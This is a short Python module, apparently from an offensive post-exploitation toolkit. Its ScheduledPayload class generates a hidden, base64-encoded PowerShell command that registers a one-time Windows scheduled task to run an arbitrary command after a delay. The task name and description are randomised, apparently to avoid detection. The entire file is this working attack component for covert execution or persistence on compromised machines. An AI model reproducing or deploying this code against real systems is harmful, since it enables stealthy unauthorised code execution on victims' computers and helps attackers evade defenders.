import base64
import string
import random
import sys

class ScheduledPayload(object):

    def __init__(self, command, args, delay=180):
        self.command = command
        self.args = args
        self.delay = delay
        self.description = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        self.taskname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

    def execute(self):

        return 'powershell.exe -nop -w hidden -encodedCommand '+base64.b64encode(('''ipmo ScheduledTasks
$action = New-ScheduledTaskAction -Execute '%s' -Argument '%s'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(%d) # tick tick tick ;)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "%s" -Description "%s"''' % (self.command, self.args, self.delay, self.taskname, self.description)).encode('utf-16-le'))
